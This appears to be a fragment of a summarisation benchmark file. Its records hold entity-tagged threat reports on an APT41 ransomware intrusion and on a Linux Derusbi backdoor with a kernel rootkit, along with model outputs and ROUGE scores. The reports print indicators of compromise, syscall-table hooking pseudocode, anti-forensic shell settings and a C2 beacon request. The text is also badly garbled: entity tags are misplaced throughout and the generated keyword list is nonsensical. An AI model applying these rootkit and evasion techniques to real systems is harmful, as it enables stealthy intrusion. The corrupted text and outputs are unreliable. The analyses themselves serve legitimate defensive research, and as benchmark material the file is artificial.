connection tester . It takes a line - based file of hostnames named [ORG] ip.txt as input and records the result of its testing in a file named o.txtTo determine reachability , MiPing initially attempts to ping each host ( [ORG] ICMP [ORG] ECHO ) while recording successes in the output file . In the event that no ping response is received , MiPing proceeds to iterate through a list of [CARDINAL] 4 hardcoded ports ( [CARDINAL] 445 , [CARDINAL] 135 , [DATE] 22 and [DATE] 80 ) and attempts to connect to each . If any connection succeeds , the host is also recorded as reachable in the output file.12/15MiPing attempting to connect on hardcoded ports after pinging failedICMP ECHO packets generated by MiPing contain a custom hardcoded payload [ORG] Data [ORG] Buffer : Hardcoded ICMP ECHO payloadOur testing however showed that the payload is not suitable for network signature generation , as the same payload string appears to be used in commercial software , including games . MiPing also offers command line switches to influence its behavior:-m < timeout > can be used to change network timeouts -t < num > can be used to change the number of threads to useSimilarities With Publicly Disclosed [ORG] AttacksThe tactics , techniques and procedures ( TTPs ) observed in this case align with several publicly disclosed security incidents that were attributed to APT41 with medium - high confidence . The most noteworthy publications that support this attribution claim are : The publicly disclosed security incidents referenced in this article all have in common , that the threat actor leveraged [ORG] Jetico [ORG] BestCrypt and [ORG] Microsoft [ORG] BitLocker to encrypt compromised systems . Additionally , the ransom notes discovered as part of the security incident all follow the same format . Furthermore , in all observed cases the threat actors relied on batch scripts for discovery purposes and to facilitate the encryption of systems . [ORG] IoCs13/15NATBypass ( [PERSON] na.exe ): [ORG] NATBypass [ORG] Cabinet [ORG] Archive Bitlocker encryption batch - script [ORG] Bitlocker encryption prep batch - script [PERSON] Distribute [PERSON] Jetico BestCrypt batch - script Execute bitlocker encryption batch - script ( end.bat ): MiPing ( p.exe ): [PRODUCT] Discovery batch - script ( cmd-webshell.txt ): [GPE] China Chopper Web Shell ( supp0rt.aspx ): Jetico BestCrypt ( bcfmgr.exe ): [PERSON] Files and Paths : [PERSON] C:\\inetpub\\wwwroot\\aspnet_client\\supp0rt.aspx SYSVOL\\_BAD_crypt\\bcfmgr.exe C:\\inetpub\\wwwroot\\aspnet_client\\Procdump.exe C:\\inetpub\\wwwroot\\aspnet_client\\Procdump64.exe C:\\inetpub\\wwwroot\\aspnet_client\\na.exe C:\\PerfLogs\\secretsdump.exe [QUANTITY] C:\\PerfLogs\\hashes.txt [QUANTITY] C:\\Windows\\copys.bat C:\\tools\\crypt\\x64\\bcfnt.sys C:\\Readme.txt C:\\tools\\disk.txt [ORG] C:\\PerfLogs\\1.bat C:\\tools\\1.bat C:\\tools\\address.txt C:\\tools\\end.bat C:\\tools\\crypt\\bcfmgr.exe14/15C:\\tools\\copy.txt C:\\PerfLogs\\cmd - webshell.txt C:\\PerfLogs\\p.exe Ransom : [PERSON] BAT / BLJammer . A!dhaMITRE [PERSON] ATT&CK : : : : : : : : : / : : : : and : : : : : : : : : - : : : : : : : : via : [ORG] Tools and TacticsJetico \u2019s BestCrypt ( Impact ) NATBypass ( [ORG] Command and Control ) wmic ( Discovery / Execution ) del ( Defense Evasion)DetectionsSigma rule to detect RDP usage through a previously exposed RDP port ( by using tools such as [ORG] NATBypass):15/15", "generated_text": "APT41; operations; a German company; the financial sector; March 2022; Microsoft Defender; MDE; the attackers; a China Chopper web shell; this vulnerability; PowerShell Cmdlets; Sys.exe; PowerShell Cmdlets; NumPossible; Control; a second domain controller; the attacker; a.s.; access; the Exchange Server; RDP; the server; NATBypass; the C&C servers; a year; Sys.exe; the Windows registry; the C2 server; a password; the NTBSI port; the server; addition; the attacker; the HTTPS port; the NTBSI port; the NTBSI port; the Microsoft Exchange Management log; the incident response; IP; the scope; the incident; the targeting; the NTBSI port; a ransom note; the victim; a ransom note; a ransom note; a ransom note; the threat actor; the environment.", "ref_text": "<START-1>The document describes an investigation by DCSO CyTec into a campaign conducted by APT41 against a German financial company. The initial intrusion occurred in March 2021 via exploitation of ProxyLogon vulnerabilities in Exchange Server. The actor installed a China Chopper webshell for persistence. After over a year of inactivity, the actor returned in March 2022, having retained access via the webshell. The actor conducted credential dumping with Procdump and lateral movement to a domain controller. The DC was used to stage tools and run discovery scripts to identify targets. The actor leveraged commercial encryption software Jetico BestCrypt to encrypt servers and Microsoft BitLocker to encrypt workstations. Batch scripts were used to automate deployment across systems. Ransom notes were distributed demanding bitcoin. While encryption was attempted across many systems, it was blocked by Microsoft Defender for Endpoint. Forensics showed the actor's tactics, including living off the land tools, deleting scripts, and RDP access via NATBypass. Overlaps exist with other campaigns attributed to APT41. In summary, APT41 retained access via webshell, conducted discovery, and attempted ransomware deployment which was ultimately unsuccessful due to endpoint detection. The incident highlights the group's ongoing targeting of foreign corporations using ransomware, encryption software, and native tools. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.5142857142857143, "gpt3/lexical/rouge_rouge2": 0.11488250652741513, "gpt3/lexical/rouge_rougeL": 0.24415584415584415, "gpt3/lexical/rouge_rougeLsum": 0.24415584415584415, "gpt3_generated_text": ["The article discusses an investigation into the operations of APT41, a threat actor group, targeting a German company in the financial sector in March 2022. The company contacted DCSO for help after discovering a ransom note on its servers, but the encryption attempt was thwarted by Microsoft Defender for Endpoint. DCSO's Incident Response Team supported the client in determining the attack vector and providing remediation support. The initial attack vector was a vulnerable Microsoft Exchange Server, compromised using the ProxyLogon exploit. The threat actor used a China Chopper web shell to persist on the compromised server and laterally moved to a domain controller. They used Jetico's BestCrypt for server encryption and Microsoft Bitlocker for workstation encryption. The threat actor accessed compromised systems through RDP by exposing the RDP port to the internet with the help of NATBypass. The article provides a timeline of the security incident, highlighting key events and activities of the threat actor. Overall, the investigation sheds light on the tactics, techniques, and procedures used by APT41 and the importance of proactive security measures in defending against such attacks."]}, {"split_name": "test", "sample_id": "test_6", "prompt_text": "Extract the keywords: FIDELIS THREAT ADVISORY # [DATE] 1021 [ORG] The [ORG] Turbo [ORG] Campaign , Featuring Derusbi for [QUANTITY] 64 - bit [LAW] LinuxFebruary [LAW] 29 , 2016Executive SummaryIn the [DATE] summer [DATE] of [DATE] 2015 , [PERSON] Fidelis [PERSON] Cybersecurity had the opportunity to analyze a [ORG] Derusbi malware sample used as part of a campaign we [ORG] \u2019ve labeled [ORG] Turbo , for the associated kernel module that was deployed . [ORG] Derusbi has been widely covered and associated with [NORP] Chinese threat actors . This malware has been reported to have been used in high profile incidents like the ones involving Wellpoint / [ORG] Anthem , [ORG] USIS and [ORG] Mitsubishi [ORG] Heavy [ORG] Industries . These incidents have ranged from simple targeting to reported breaches . Every one of these campaigns involved a [PRODUCT] Windows version of [ORG] Derusbi . While we \u2019ve analyzed many common variants of [ORG] Derusbi , this one got our attention because it \u2019s a Linux variant . A few items make the tools used in this campaign special : z This is a [QUANTITY] 64 - bit Linux variant of [ORG] Derusbi , the only such sample we have observed in our datasets as well as in publicrepositories . To our knowledge , no analysis of such malware has been made publicly available.z We retrieved and analyzed a [CARDINAL] 64 - bit Linux kernel module that was dropped by [ORG] Derusbi . We \u2019re calling this moduleTurbo.z Both the malware and kernel module demonstrate cloaking and anti - analysis techniques . While they mimictechniques observed in Windows tools used by [ORG] APT in some respects , the use in the Linux environment has forced new and sometimes unique implementations.z This [ORG] Derusbi sample shares command - and - control infrastructure with PlugX samples targeting Windows systemsseen in public repositories . It is our understanding that these tools were used in conjunction in the campaign.z The [ORG] Derusbi sample has command and control ( C2 ) patterns that precisely match those observed with the Windowssamples . This will allow for reuse of command and control platforms for intrusions involving both [WORK_OF_ART] Windows [WORK_OF_ART] and [WORK_OF_ART] Linux [WORK_OF_ART] samples.z In this incident , we believe that the binary was recompiled on the same day it was installed with the kernel modulerebuilt to precisely match the configuration on the target system , potentially indicating the active participation of developers with the team conducting the operation . This is distinct from the workflow associated with the more mature [ORG] APT tools , where builders for tools like PlugX , [PERSON] Sakula and [PERSON] Derusbi are assumed to be available to multiple actor sets who are likely simply users of these tools.z The active participation of developers is further substantiated by the use of the Turbo Linux [PERSON] Kernel [PERSON] Module , whichwas clearly compiled for the precise Linux version running on the target system. \u00a9 Fidelis CybersecurityTA_Fidelis_Turbo_16021It is important to note that it would take significant additional effort to replicate the capabilities of the Windows version into the Linux version . This indicates an investment by the adversary to gain additional footholds within a victim \u2019s infrastructure . By adding [CARDINAL] 64 - bit Linux servers and clients to their target list it is evident that advanced threat actors continue to add to their capabilities . Enterprises worldwide have been investing in [GPE] Windows - based detection and remediation platforms for [DATE] many [DATE] years now . Linux is widely used in the datacenter and for hosting critical applications and databases . The use of such malware instantly bypasses entire classes of commercial , Windows - only products , thus opening up significant new exposures for enterprises . Campaign OverviewThe targeted victim is a large public research institution in [GPE] the [GPE] United [GPE] States . All activity reported in this paper was observed in [DATE] the [DATE] summer [DATE] of [DATE] 2015 . The samples discussed in this report are not available in public malware repositories and we are not at liberty to share them . We are publishing a comprehensive set of IOCs and a [ORG] Yara rule to enable researchers and incident responders in the hope that this will help flush out other samples that might be identified in intrusions or private malware repositories . The incident involved the adversary obtaining ssh access to the target system and then using a standard [ORG] GNU utility ( wget ) to fetch the malware samples from the [ORG] IP address [CARDINAL] 175.45.250.xxx Command and control communications were observed going to a URL that has also been observed in PlugX samples . The malware binary downloaded carried a date string in its naming convention that represented the very day that it was downloaded . This is strongly suggestive of the malware having been compiled [DATE] that [DATE] day , which can further suggest that a developer was actively associated with the operation . The binary was then renamed to strip this additional information from the filename . In this campaign , the adversary appears to use the [ORDINAL] second level sub - domain as campaign moniker potentially serving purposes such as impersonation ( spoofing ) and target / campaign identification . This technique also seen used by multiple [NORP] Chinese actors including the attacks on [GPE] Anthem , OPM and , most recently , the \u201c [WORK_OF_ART] Seven [WORK_OF_ART] Pointed [WORK_OF_ART] Dagger \u201d ( [ORG] Mynamar [ORG] Election site compromise ) as discussed by [ORG] Arbor [ORG] Networks . Further , the [ORDINAL] first level domain observed is a Go - Daddy registered domain originally created in [DATE] February [DATE] 2015 to a massive - scale , [NORP] Chinese - based domain broker registered to the email address , \u201c Bodfeo[@]163[.]com \u201d . Note that infrastructure detailed in recent reports on the use of [PERSON] Derusbi by the [ORG] C0d0s0 group used the same registration email and registrant details . The hosts used to serve the malware and provide command and control functions were within the [ORG] IP range for a [NORP] Korean hosting provider , [PERSON] Netropy . We were able to correlate sharing of C2 infrastructure and capabilities between this Linux variant of [ORG] Derusbi and [CARDINAL] two Windows variants of the PlugX malware. \u00a9 [PERSON] Fidelis CybersecurityTA_Fidelis_Turbo_16022Malware [PERSON] AnalysisThe campaign involved the use of the [ORG] Derusbi sample , which is a user space shared object library and a Linux kernel module that we \u2019re calling [PERSON] Turbo . We assume that there was a custom loader created to load the shared object library and a user space client to drive [ORG] Turbo . Because we did not have the custom loader and the user space client available for our analysis we recreated each component after understanding the capabilities of the [ORG] Derusbi and [PERSON] Turbo binaries . It is possible that these functions were combined in the same binary.loadso(custom loader)1DerusbiClientUser spaceKernel space23Turbo1 . Upon execution , the loaderloads [ORG] Derusbi into memory to gain execution2 . Derusbi drops [PERSON] Turbo to disk , loads it into the kernel , then deletes [PERSON] Turbo from disk3 . The [GPE] Client uses [PERSON] Turbo to hiderelevant user space processesThe following characteristics and capabilities were observed for the samples we discuss in [ORG] this [ORG] paper.z Remote Access Tool \u2014 Directory listing \u2014 Read files \u2014 Write files \u2014 [PERSON] Copy files \u2014 Rename files \u2014 [ORG] Delete files \u2014 Timestomping \u2014 Execute commands \u2014 [PERSON] Remote [PERSON] Bash shellz Anti - Forensics \u2014 [ORG] Loads a Linux Kernel Module ( [ORG] LKM ) and deletes it from the hard disk forcing the [ORG] LKM to be memory residentonly . \u2014 In addition to deleting the [ORG] LKM , overwrites the data with null bytes to prevent recovery of original data . \u2014 [PERSON] Remote [PERSON] Bash shell history is sent to /dev / null \u00a9 Fidelis CybersecurityTA_Fidelis_Turbo_16023z File System \u2014 Writes [PERSON] a [PERSON] Linux [PERSON] LKM to /dev / shm/.x11.id \u2014 Deletes the [ORG] LKM shortly after installing it in the systemz Networking \u2014 Binds to source ports between the range [CARDINAL] 31800 to 31900 and beacons to destination port [CARDINAL] 443\u2022 The traffic is not SSL / TLS encrypted \u2014 Observed [QUANTITY] 64 - byte custom protocol beacon during execution \u2014 Uses a backup communication method with HTTP beacon\u2022 Content in the session is obfuscated with a variable 4 - byte [ORG] XOR keysz Turbo Kernel Module \u2014 Hides ProcessesA number of anti - forensics techniques must be bypassed in order to determine the true capabilities of this sample . Some of these techniques used to hamper forensic analysis include the ability to run as a memory - resident memory module to prevent file - based detection of [ORG] the [ORG] Linux [ORG] Kernel [ORG] Module on the localhost and the ability to cleanly remove it from disk . Analysis of DerusbiFile : libcrypst.soThis [QUANTITY] 64 - bit Linux variant of [ORG] Derusbi shares many of the common capabilities provided by a typical remote access tool , including directory and file operations , command execution and remote access . Additionally , obfuscation capabilities such as timestomping and process hiding make this sample even more interesting and difficult to analyze . Static analysis libcrypst.so is a malicious [QUANTITY] 64 - bit , dynamically linked , stripped , [ORG] Linux [ORG] Shared [ORG] Object ( .so ) library which is the [PERSON] Derusbi binary . Despite the symbols being stripped from this binary there were a couple of interesting artifacts . For example , this binary \u2019s actual [PERSON] Linux [PERSON] Shared [PERSON] Name is LxMain64.libcrypst.so is the file \u2019s name as recovered from the victim . In the event this file is noticed by a system administrator , the file uses a common looking filename on disk . In this case , libcrypt.so is a file one would expect to find , whereas libcrypst.so is not . This is an example of the adversary attempting to hide in plain sight. \u00a9 Fidelis CybersecurityTA_Fidelis_Turbo_16024.data segment The .data segment of the LxMain64 ( SO ) file contains [CARDINAL] two particularly important blocks of embedded data , the [ORDINAL] first starting at the file offset : \u201c 0x133C0 \u201d . The [ORDINAL] first [CARDINAL] four bytes of this data block is a 4 - byte XOR key used to decode the embedded byte array at offset : \u201c 0x133CC \u201d . [DATE] The [DATE] next [DATE] eight bytes , starting at file offset : \u201c 0x133C4 \u201d is actually a 4 - byte [ORG] DWORD value repeated twice and used to define the length of the byte array . The byte array starting at file offset : \u201c 0x133CC \u201d is an obfuscated Linux Kernel Module , which can be decoded using the previously found 4 - byte XOR key . In this sample the [LAW] XOR key is \u201c 0x84 0x1B 0x37 [CARDINAL] 0xD6\u201d . This segment is significant because the Turbo Linux [PERSON] Kernel [PERSON] Module is present here . The \u201c LxMain64 \u201d binary also contains a [ORDINAL] second obfuscated data block within the library . This block is [CARDINAL] 632 bytes in length and is found starting at file offset : \u201c [PERSON] 0x15780 \u201d . This data is obfuscated again using another 4 - byte XOR key . This XOR key is \u201c [CARDINAL] 0x76 0x2D 0xF2 0x41 \u201d . When the key is applied , the [CARDINAL] C2 configuration data is observed in the data block . Export functions The following export functions were observed in the \u201c libcrypst.so \u201d malware : z iswdigit(wchar_t ) z startDespite the existence of a legitimate API function named iswdigit , the function has been reimplemented within this binary . This is not a \u2018 trampoline \u2019 technique where malware will jump execution to the standard system iswdigit implementation after being loaded into memory , as it would a [GPE] Trojan library . Anomalous fini_array section analysis When the shared object is loaded into memory , [CARDINAL] two segments are called prior to the system reaching this shared objects defined entry point or \u201c start \u201d routine . The very [ORDINAL] first segment is the usual \u201c .init_proc \u201d segment commonly found in a Linux executable , and the [ORDINAL] second segment is the \u201c .init_array \u201d segment . The .init_array segment contains pointers to functions which will be executed when the program starts . In this segment several environmental conditions are checked , a shared memory resource is created , and a new thread is started that begins the [ORG] Derusbi backdoor activity . The .init_array segment was a reminder of [ORG] Windows [ORG] TLS [ORG] Callback functions , and how they are abused by Windows malware to gain execution before the binary \u2019s configured entry point . It is interesting to note that this binary \u2019s \u201c [WORK_OF_ART] Main [WORK_OF_ART] Entry \u201d or \u201c start \u201d routine is set to occur within the execution of the \u201c .fini _ array \u201d segment . This entry point configuration was contrary to what we expected , because the .fini_array segment typically contains pointers to functions that will be executed when the program prepares to exit . Despite the start \u00a9 Fidelis CybersecurityTA_Fidelis_Turbo_16025routine \u2019s name and role as the entry point of the binary , its functionality does align with the typical .fini_array function . The start routine \u2019s set functionality is to initiate the malware \u2019s shut - down procedures by continuously waiting for the termination of the thread previously started during the .init_array segment \u2019s execution . Target system verification Before beginning execution of any malicious code the malware gathers and checks certain running conditions . If those running conditions are not met the malware will terminate early . [ORDINAL] First , it gathers , for later use , the file path from which the shared object will be loaded . Next , it gathers the file path of the process context \u2019s executable module , the loader module . The binary also collects the current and parent process IDs , but does n\u2019t do anything with them . The [ORDINAL] first branch to determine early termination is by a check to see if the user \u2019s ID is anything other than zero . On Linux systems [CARDINAL] zero is the root user \u2019s ID , and this [PERSON] Derusbi module will not execute if it does not have root privileges . Finally , the last check is to determine if [ORG] the [ORG] Shared [ORG] Object has been loaded into the process space of certain daemon processes to ensure reliable execution . The following is the list of daemon processes that are validated before [ORG] Derubsi proceeds to execute : z /usr / sbin / sshd z /sbin / rsyslogd z /usr / sbin / rsyslogd z /sbin / syslogd z /usr / sbin / syslogd z /usr / sbin / smbd z /usr / sbin / crond z /loadsoThe last process , name \u201c loadso \u201d , allows the shared object to be executed no matter what directory as long as the parent daemon process name is called \u201c loadso \u201d . We suspect the \u201c loadso \u201d name could either be a leftover artifact name of the author \u2019s daemon process during creation and testing , or is an additional binary that the operator may copy to the victim when execution via one of the other listed daemon processes is not possible. \u00a9 Fidelis CybersecurityTA_Fidelis_Turbo_16026Shared memory segments After the environment conditions are met the malware will create a System V shared memory segment , which is a way to attach a segment of physical memory to the virtual address spaces of multiple processes . [ORG] Derusbi utilizes the shared memory segment for forks of itself during operation of a Linux Kernel Module , and remote shell execution . During our analysis the shared memory segment \u2019s creation had the name of \u201c SYSV82015f0d \u201d , which is a joining of the [CARDINAL] two strings \u201c SYSV \u201d and the hexadecimal string representation of the key argument [CARDINAL] 0x82025f0d passed during the API call , shmget , of the segment \u2019s creation . This artifact is especially relevant for security personnel conducting [ORG] IR analysis on a host . Looking for the [ORG] GCC compiler As shown in the following code segment , the [ORG] Derusbi variant also gathers information about the victim host . This information includes the name of the local host , version of [ORG] GCC ( [ORG] GNU [ORG] Compiler [ORG] Collection ) and the system information about the machine and operating system . The information is transferred back to the command and control infrastructure via network beacons . It is our estimation that this is not relevant for execution of the malware but could have been captured in case the kernel module might have to be recompiled on the victim \u2019s system. \u00a9 Fidelis CybersecurityTA_Fidelis_Turbo_16027Remote execution behavior The malware sample also has the the ability to run an executable or create a remote shell on the victim computer . To do this , it forks off a new process . Once the process is forked , the newly created process configures its environment . The window size is set to [CARDINAL] 35 rows and [CARDINAL] 80 columns with a [CARDINAL] 0x0 pixel frame . It then creates an array of the following environment variables : z \u201c HISTFILE=/dev / null \u201d z \u201c PATH=/bin:/sbin:/usr / bin:/usr / sbin \u201d z \u201c PS1 = RK # \\u@\\h:\\w \\$ \u201d z \u201c HOME=/ \u201d z \u201c TERM = [ORG] vt100 \u201d z \u201c LS_COLORS=\u2019\u2019\u201dCritically , this configures the shell to not record command history , a useful anti - forensic technique . Also this configuration results in the creation of a very specific Linux shell prompt that looks roughly likeRK # < username>@<hostname>:<working directory>$This is very notable because it could represent a quirk on the part of the adversary or a requirement for remote scripts that might be run once command and control is established . During remote execution , if a shell is being created , it makes the following system call : execve(\u201c/bin / bash \u201d , \u201c dbus - daemon \u201d \u201c \u2013 noprofile \u201d \u201c --norc \u201d , & envp);Otherwise it executes : execve(<executable > , \u201c dbus - daemon \u201d , & envp);The use of \u201c dbus - daemon \u201d is an interesting trick used to make detection of a spawned process more difficult . This sets argv[0 ] to \u201c dbus - daemon \u201d rather than the standard name of the executing process . Examining the running processes using the \u201c ps \u2013 ef \u201d command , reveals dbus - daemon rather than the actual executable that was created . System administrators would expect the presence of this daemon on the process list and so this becomes another feature enabling the malware to hide in plain sight . The Turbo Loadable Kernel Module ( [ORG] LKM ) File : .x11.idIn this section , we describe stealth techniques used by [ORG] Turbo , how it communicates with the userland client and the capabilities it provides . Based upon the research , it appears that the techniques and source code described in the following blog post were used in the creation of this [ORG] LKM . ( url we did not have access to the userland client used in the campaign , we wrote our own , later referenced as \u201c x11evilclient\u201d. \u00a9 [PERSON] Fidelis CybersecurityTA_Fidelis_Turbo_16028Installation and cloaking The [PERSON] Derusbi sample decodes and drops the Loadable Kernel Module , [PERSON] Turbo , to the /dev / shm/ directory as \u2018 .x11.id \u2019 and installs it using the insmod program . The module is loaded into kernel space in an effort to modify the systems global call table . User spaceKernel spaceSystem Call TableProcessSystem call handlerReplaces Address in System call table with location of evil write functionLoadable KernelModuleWrite - ( syscall)write()Evil Write - ( in LKM)evil_write ( ) functionality executed then pass to originalsyscall [CARDINAL] 1 : [CARDINAL] 5.2 Rootkit and OS Architecture \u2014 url aspect of the systems call table that is modified pertains to process IDs ( PIDs ) . The functionality of this [ORG] LKM gives a user space application the ability to hide and/or unhide any process running on the system , which in turn makes detection of the attacker \u2019s malicious applications harder to detect when running on the victim \u2019s system . After the [ORG] LKM is successfully loaded via insmod and before it has the ability to modify the system call table , the [ORG] LKM needs to disable the CPUs control register zero \u2019s ( CR0 ) write protection . Once CR0 \u2019s write protection is disabled , the [ORG] LKM has the ability to modify the system call table . Directory entries associated with each [ORG] PID found in the call table can now be referenced . If an attacker chooses to hide a process ID found in the directory entry structure from the system call table , that process ID is not appended to the modified system call table that the [ORG] LKM has duplicated and modified . Therefore it will no longer be seen from any command that shows what processes are running on the system. \u00a9 Fidelis CybersecurityTA_Fidelis_Turbo_16029 ; [CARDINAL] 77 : v15 = _ _ readcr0();movrax , cr0 ; [CARDINAL] 78 : v16 = v15;movecx , eax ; [CARDINAL] 80 : v13 = v17 = = 0;movrax , rcx ; [CARDINAL] 79 : v17 = v15 & 0xFFFEFFFF;//Changing control bit to allow write write_cr0 ( read_cr0 ( ) & ( ~ 0x10000));original _ getdents = ( void * ) sys_call_table[__NR_getdents ] ; sys_call_table[__NR_getdents ] = new_getdents ; write_cr0 ( read_cr0 ( ) | 0x10000);pseudocode example of hooking the system call table . ; [CARDINAL] 81 : ; [CARDINAL] 82 : andrax , 0FFFFFFFFFFFEFFFFh__writecr0(v17);movcr0 , rax// # define GPF_DISABLE write_cr0(read_cr0 ( ) & ( ~ 0x10000))// # define [WORK_OF_ART] GPF_ENABLE [WORK_OF_ART] write_cr0(read_cr0 ( ) | [CARDINAL] 0x10000 ) ; [CARDINAL] 83 : [CARDINAL] qword_2200 = * ( int ( _ _ fastcall * * ) ( _ [ORG] QWORD , _ [ORG] QWORD , _ QWORD))(*(_QWORD * ) ( readdir_pid [DATE] + [DATE] 40 ) + 48LL);movmovmovrax , [ rdx+28h]rax , [ rax+30h]cs : [CARDINAL] qword_2200 , rax ; [CARDINAL] 84:*(_QWORD * ) ( * ( _ QWORD * ) ( readdir_pid [DATE] + [DATE] 40 ) + 48LL ) = disable_protection_cr0;movmov ; 85:__writecr0(v16);rax , [ rdx+28h]qword ptr [ rax+30h ] , offset disable_protection_cr0movmovrax , rcxcr0 , raxida disassembly from [LOC] the [LOC] x11.1d [LOC] LKMCommunication with the user space client The [ORG] LKM creates a netlink socket so that it can transport data from kernel space to userland . This is noteworthy because typically such communications would occur using [CARDINAL] one or more ioctls exposed by the kernel module . It is possible this was done to facilitate a looser coupling with the client module and promote code reuse of [PERSON] Turbo for other malware campaigns . The function is called from the kernel module as follows:.text:0000000000000868 ; [CARDINAL] 64 : LODWORD(v11 ) = _ netlink_kernel_create(&init_net , [DATE] 29LL , _ this_module , & unk_F00);.text:0000000000000868 mov rdx , offset _ _ this_module.text:000000000000086F mov rcx , offset unk_F00.text:0000000000000876 mov rdi , offset init_net.text:000000000000087D call _ _ netlink_kernel_create \u00a9 [PERSON] Fidelis CybersecurityTA_Fidelis_Turbo_160210The userland application used by the attackers does not require any special access , such as root , in order to communicate with the [ORG] LKM . The send_net_link_message ( ) function is used from user space to send function requests to the [ORG] LKM as illustrated.hide_pid(signed int a1);unhide_pid(signed int a1);is_hidden_pid(signed int a1);clear_hidden_pid();Analysis of another rootkit called StealthProc.c shows how the user code might interface with the [ORG] LKM , using the send_net_link_message ( ) function to send requests , such as [ORG] hide_pid(255 ) , to hide process ID [CARDINAL] 255 on the system . Hiding the userland client : We \u2019ve named our example client \u201c x11evilclient \u201d to illustrate how an attacker would execute commands via the command line in order to utilize the x11.id LKM.Each of the commands issued from the user application \u201c x11evilclient \u201d correlates with a function that the [ORG] LKM will execute . Hide PID$ ./x11evilclient 1 [ pid ] Unhide PID$ ./x11evilclient [CARDINAL] 2 [ pid ] Is PID Hidden?$ ./x11evilclient [CARDINAL] 3 [ pid ] Clear hidden PIDs$ ./x11evilclient 4For the client to communicate with the x11.1d LKM , a [ORG] module_code number is called from the user space application . It has to match the number used in the create netlink_kernel_create function on the kernel side . If an attacker chooses to call the hidepid function with the argument for the [ORG] PID to hide , the directory entry associated with the called [ORG] PID in the system table is added to a list of hidden PIDs . The directory entry structure is rebuilt for each normal process ID and included in the new copied version of the system call table . The hidden [ORG] PID called from userland is not included in the system call table . Unhidepid will reference the list of saved hidden PIDs and restore the associated directory entry for the processes the attacker would like to unhide . Upon removal , [ORG] Turbo will restore the original system call table . [ORG] Turbo \u2019s purpose is clearly to help cover the tracks and activities of this threat group . Utilizing a kernel module that hooks the system call table in order to modify the visibility of PIDs from user space is an advanced technique in our estimation. \u00a9 Fidelis CybersecurityTA_Fidelis_Turbo_160211Networking / Command and Control When making command and control interactions , this malware binds to a raw socket on a random source port [CARDINAL] between [CARDINAL] 31800 [CARDINAL] and [CARDINAL] 31900 , and beacons to the preconfigured destination port from the earlier mentioned C2 configuration block . Although this particular sample was configured to beacon to the [ORG] HTTPS destination port [CARDINAL] 443 , the data transmitted is not SSL / TLS encrypted . Additionally , this malware uses a backup communication method of an HTTP beacon with the content in the session obfuscated with variable 4 - byte XOR keys . The following [ORG] POST request was observed : POST /photos / photo.asp HTTP/1.1 HOST:[C2 Domain Removed]:443 User - Agent : Mozilla/4.0 Proxy - Connection : Keep - Alive Connection : Keep - Alive Pragma : no - cacheThen , the command and control server responded with the following : [ORG] HTTP/1.0 [ORG] 200 Server : Apache/2.2.3 ( Red Hat ) Accept - Ranges : bytes Content - Type : text / html Proxy - Connection : keep - aliveAfter receiving this response , the victim system \u2019s next beacon contained the following data : After \t receiving \t this \t response , \t the \t victim \t system \u2019s \t next \t beacon \t contained \t the \t following \t data : Offset [CARDINAL] 0 1 2 3 4 5 6 7 8 9 A B C D E F 00000000 B6 00 00 00 01 00 00 00 60 29 00 00 [CARDINAL] F7 [ORG] C8 [CARDINAL] 2D 3E \u00b6 ` ) \u00f7\u00c8- > 00000010 01 00 00 00 3C 01 00 00 FF [CARDINAL] 05 E1 32 B7 00 00 00 < \u00ff \u00e12 \u00b7 00000020 9B FA 00 3E [CARDINAL] D7 D0 2D 3E F4 AA 00 00 00 00 00 00 \u203a\u00fa > \u00d7\u00d0->\u00f4\u00aaDQ\u0192\u00a5 00000030 EF [CARDINAL] 30 2D 34 F7 [CARDINAL] 20 [CARDINAL] 20 [CARDINAL] 20 D9 20 03 20 20 E6 20 20 \u00ef0 - 4\u00f7 \u00d9 \u00e6 00000040 20 20 39 3F F1 CA [CARDINAL] 2D 3E [CARDINAL] F7 [CARDINAL] 84 44 50 [CARDINAL] 82 B0 04 BE 9?\u00f1\u00ca->\u00f7\u201eDP \u201a \u00b0 \u00be [CARDINAL] 00000050 F7 E6 F1 [CARDINAL] 3F F7 DC 1E 10 C6 FB [CARDINAL] 03 [ORG] 0E [ORG] DA [ORG] FD [CARDINAL] 18 [CARDINAL] 13 \u00f7\u00e6\u00f1?\u00f7\u00dc \u00c6\u00fb \u00da\u00fd 00000060 [DATE] 90 [DATE] AD [DATE] 43 5B 85 [CARDINAL] C8 0E 07 C3 E5 78 5C 82 A6 59 4B \ufffd -C[ \u2026 \u00c8 \u00c3\u00e5x\\\u201a \u00a6 YK 00000070 D7 9B 60 [PRODUCT] 6E [PRODUCT] D7 [PRODUCT] C8 [DATE] 55 [DATE] 06 C1 97 1B 0A DF C8 2C A2 \u00d7\u203a`n\u00d7\u00c8U \u00c1 \u2014 \u00df\u00c8,\u00a2 00000080 FE CE 0D [CARDINAL] 48 [CARDINAL] 92 [ORG] BA 5E 57 98 A6 0D 13 03 [ORG] C8 2D 2F \u00fe\u00ce H\u2019\u00ba^W\u02dc \u00a6 \u00c8-/ 00000090 9E AB 0D 16 95 [ORG] BD 44 52 [CARDINAL] 93 [ORG] AC 6D 5C 85 A7 5A 50 \u017e \u00ab \u2022\u00bdDR\u201c\u00acm\\ \u2026 \u00a7ZP [CARDINAL] 000000A0 9E AD 04 [CARDINAL] 1E F7 AF [CARDINAL] 4E [CARDINAL] 5D D7 BE [CARDINAL] 48 4C [CARDINAL] 84 [QUANTITY] A1 [QUANTITY] 42 [QUANTITY] 50 [QUANTITY] \u017e- \u00f7\u00afN]\u00d7\u00beHL\u201e\u00a1BP 000000B0 D7 FC 2D 2F [PRODUCT] F7 [PRODUCT] C8 \u00d7\u00fc-/\u00f7\u00c8Offset 0 1 2 3 4 5 6 7 8 9 A B C D E F 00000000 [CARDINAL] 41 [ORG] C8 2D 3E F6 [ORG] C8 [CARDINAL] 2D 3E [CARDINAL] 97 E1 2D 3E 00 00 00 00 A\u00c8->\u00f6\u00c8->\u2014\u00e1- > 00000010 F6 C8 2D 3E CB C9 2D 3E [CARDINAL] 08 CD CC 0C 40 00 00 00 \u00f6\u00c8->\u00cb\u00c9- > \u00cd\u00cc @ 00000020 6C 32 2D 00 20 18 00 00 03 62 00 00 00 00 00 00 l2- 00000030 [CARDINAL] 18 F8 00 [ORG] 0A 00 20 20 20 [CARDINAL] 2E [CARDINAL] 20 [CARDINAL] 2E [CARDINAL] 20 20 [CARDINAL] 2E [CARDINAL] 20 [CARDINAL] 20 \u00f8 . . . [CARDINAL] 00000040 20 20 14 01 06 02 00 00 00 [CARDINAL] 4C [CARDINAL] 69 6E 75 78 29 80 Linux)\u20ac 00000050 00 2E DC 